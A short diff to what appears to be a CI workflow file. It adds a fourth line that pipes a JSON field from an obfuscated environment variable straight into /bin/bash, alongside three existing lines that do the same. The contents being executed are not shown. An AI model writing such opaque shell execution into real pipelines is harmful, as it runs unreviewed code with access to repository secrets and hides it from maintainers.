@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$m8" | jq -r .pmbf120 | /bin/bash
           printf '%s' "$yss00" | jq -r .dbqgs0102 | /bin/bash
           printf '%s' "$zfar5" | jq -r .dzpl153 | /bin/bash
+          printf '%s' "$s318" | jq -r .l8900 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
